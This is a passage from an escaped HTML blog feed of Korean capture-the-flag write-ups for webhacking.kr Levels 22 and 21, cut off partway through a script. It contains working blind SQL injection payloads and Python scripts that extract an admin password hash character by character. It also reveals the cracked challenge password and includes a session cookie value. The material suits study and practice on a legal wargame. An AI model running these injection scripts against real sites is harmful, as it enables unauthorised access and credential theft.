&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;아이디와 비밀번호를 넣고 로그인과 회원가입하는 버튼이 존재한다.&lt;/p&gt;

&lt;p&gt;힌트도 위 사진처럼 보여지고 있다.&lt;/p&gt;

&lt;p&gt;소스코드를 보면 uuid와 pw가 POST방식으로 전달되는 것을 볼 수 있다.&lt;/p&gt;

&lt;p&gt;회원가입을 통해 아이디를 만들고 로그인을 해보았다. (ttest / 1234)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731214938890.png&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;key값을 보아 특정 암호화가 이루어 지는것 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731215327315.png&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;key값의 길이를 알아보니 32바이트였다.&lt;/p&gt;

&lt;p&gt;32바이트 하면 떠오르는건 MD5 해시뿐이였다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731215259261.png&quot; width=&quot;500px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;예상대로 MD5였다. 복호화 문자는 ‘1234zombie’ 였다. 즉, 비밀번호를 생성하면 비밀번호 뒤에 ‘zombie’를 붙이고 md5 해싱을 하여 key값으로 사용한다.&lt;/p&gt;

&lt;p&gt;(지금 write-up쓰면서 생각해보니, ‘1234zombie’ 라는 md5값이 서버에 있는게 신기방기😂)&lt;/p&gt;

&lt;p&gt;이제 ‘admin’의 키 값만 구하면, pw를 구할 수 있을 것 같다.&lt;/p&gt;

&lt;p&gt;그럼 ‘admin’의 키 값은 어떻게 구하지?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731220217394.png&quot; width=&quot;500px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;admin으로 회원가입하기 위해 우회도 해보고 다해봤지만 안되서 아이디 부분에 SQL Injection을 하다보니&lt;/p&gt;

&lt;p&gt;위와 같은 에러가 나왔다. 쿼리가 깨진것 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731220343620.png&quot; width=&quot;200px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그래서 주석을 ‘–’ 대신 ‘#’을 사용 하였더니 위와 같이 출력되었다.&lt;/p&gt;

&lt;p&gt;즉, username 부분은 SQL Injection을 성공한 한 것이다.&lt;/p&gt;

&lt;p&gt;이제 비밀번호만 찾으면 되니 Blind Injection을 하면 될 것 같다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib.request&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;http.client&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;uuid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin' and ord(substr(pw,&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;,1))=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlencode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;application/x-www-form-urlencoded&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/plain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cookie&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PHPSESSID=[세션 값]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;webhacking.kr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/challenge/bonus/bonus-2/index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getresponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Parsing : &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Wrong password!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[-] Find : &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] password : &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180801000450015.png&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;파싱을 통해 md5값을 추출해 냈다.&lt;/p&gt;

&lt;p&gt;&amp;lt;img src=”http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731235148792.png? width=”400px”&amp;gt;&lt;/p&gt;

&lt;p&gt;MD5 Decrypt 사이트에 넣었더니 ‘rainbowzombie’ 라는 값이 나왔다.&lt;/p&gt;

&lt;p&gt;따라서 admin의 pw는 ‘rainbow’가 된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731235245302.png&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731235307383.png&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;</content><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><category term="Wargame" /><category term="webhacking.kr(Old)" /><category term="Write-up" /><summary type="html">&amp;lt;form method=post action=index.php&amp;gt; &amp;lt;table border=1 cellpadding=5 cellspacing=0&amp;gt; &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;username&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=uuid type=text&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt; &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;password&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=pw type=password&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt; &amp;lt;tr align=center&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value='login'&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &amp;lt;input type=button value='join' onclick=location.href='?mode=join' style=width:100;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;p&amp;gt; &amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; 아이디와 비밀번호를 넣고 로그인과 회원가입하는 버튼이 존재한다. 힌트도 위 사진처럼 보여지고 있다. 소스코드를 보면 uuid와 pw가 POST방식으로 전달되는 것을 볼 수 있다. 회원가입을 통해 아이디를 만들고 로그인을 해보았다. (ttest / 1234) key값을 보아 특정 암호화가 이루어 지는것 같다. key값의 길이를 알아보니 32바이트였다. 32바이트 하면 떠오르는건 MD5 해시뿐이였다. 예상대로 MD5였다. 복호화 문자는 ‘1234zombie’ 였다. 즉, 비밀번호를 생성하면 비밀번호 뒤에 ‘zombie’를 붙이고 md5 해싱을 하여 key값으로 사용한다. (지금 write-up쓰면서 생각해보니, ‘1234zombie’ 라는 md5값이 서버에 있는게 신기방기😂) 이제 ‘admin’의 키 값만 구하면, pw를 구할 수 있을 것 같다. 그럼 ‘admin’의 키 값은 어떻게 구하지? admin으로 회원가입하기 위해 우회도 해보고 다해봤지만 안되서 아이디 부분에 SQL Injection을 하다보니 위와 같은 에러가 나왔다. 쿼리가 깨진것 같았다. 그래서 주석을 ‘–’ 대신 ‘#’을 사용 하였더니 위와 같이 출력되었다. 즉, username 부분은 SQL Injection을 성공한 한 것이다. 이제 비밀번호만 찾으면 되니 Blind Injection을 하면 될 것 같다. import urllib.request import http.client import re import requests if __name__==&quot;__main__&quot;: pw =&quot;&quot; md5 = [num for num in range(48,58)]+[num for num in range(97,104)] for i in range(1,33): for j in md5: data = {&quot;uuid&quot;:&quot;admin' and ord(substr(pw,&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;#&quot;} data = urllib.parse.urlencode(data) header = {&quot;Content-type&quot;:&quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;,&quot;Cookie&quot;:&quot;PHPSESSID=[세션 값]&quot;} connection = http.client.HTTPConnection(&quot;webhacking.kr&quot;) connection.request(&quot;POST&quot;,&quot;/challenge/bonus/bonus-2/index.php&quot;,data,header) response = connection.getresponse() read = response.read() read =read.decode('utf-8') print(&quot;Parsing : &quot;+chr(j)) find = re.findall(&quot;Wrong password!&quot;,read) if find: pw += chr(j) print(&quot;[-] Find : &quot;+pw) break print(&quot;[+] password : &quot;+pw) 파싱을 통해 md5값을 추출해 냈다. &amp;lt;img src=”http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731235148792.png? width=”400px”&amp;gt; MD5 Decrypt 사이트에 넣었더니 ‘rainbowzombie’ 라는 값이 나왔다. 따라서 admin의 pw는 ‘rainbow’가 된다.</summary></entry><entry><title type="html">[Web.kr]Level 21</title><link href="http://localhost:4000/2018/09/03/writeup-webkr-Level-21.html" rel="alternate" type="text/html" title="[Web.kr]Level 21" /><published>2018-09-03T00:00:00+00:00</published><updated>2018-09-03T00:00:00+00:00</updated><id>http://localhost:4000/2018/09/03/writeup-webkr-Level%2021</id><content type="html" xml:base="http://localhost:4000/2018/09/03/writeup-webkr-Level-21.html">&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 21/image-20180726144412211.png&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 21/image-20180726144840924.png&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Blind SQL Injection이라고 되어 있다. 주소창을 보니 no, id, pw값을 입력받고 있다.&lt;/p&gt;

&lt;p&gt;no에 숫자들을 입력해 보니 True라고 나오는 숫자는 1과 2뿐이다. 따라서 id값은 1과 2이다.&lt;/p&gt;

&lt;p&gt;이제 각 id에 맞는 id와 pw를 찾아내야 한다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 21/image-20180726145056313.png&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 21/image-20180726145219268.png&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1 and length(id)=5&lt;/code&gt; 를 이용하여 id의 길이가 5인 것과, pw의 길이가 5인 것을 알아 냈다. 똑같은 방법으로 no가 2인 id와 pw의 길이도 알아내면 id는 5, pw는 19의 길이를 가지고 있다.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;no&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;id&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;pw&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;? (5)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;? (5)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;? (5)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;? (19)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;이제 아이디를 찾아보자. 보통 5의 길이를 가진 id는 ‘admin’이 있다. 이를 예측해보고 no=1의 id를 substr()를 이용하여 찾아보자.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1 and ascii(substr(id, 1, 1))=97&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;위 명령어는 no가 1이고, id의 첫번째 인덱스에서 1byte가 ascii코드로 97(‘a’)인지 확인하는 명령어이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 21/image-20180726145852871.png&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;생각처럼 no=1의 id는 ‘admin’이 아닌것 같다. 하지만 같은 방식으로 no=2의 id를 비교해보니 ‘admin’이 맞았다.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;no&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;id&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;pw&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;? (5)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;? (5)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;admin (5)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;? (19)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;이렇게 하나하나씩 다 비교해 보는 것은 매우 힘든일이다. 한글자 마다 ascii코드 33부터 136까지 다 비교해봐야 하기 때문이다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'http://webhacking.kr/challenge/bonus/bonus-1/index.php?'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'PHPSESSID'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'b82bba458acf3b6fd70126be82c02e2f'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# no=1
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;137&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;no=1 and ascii(substr(pw,&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; ,1))=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password Parsing : &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
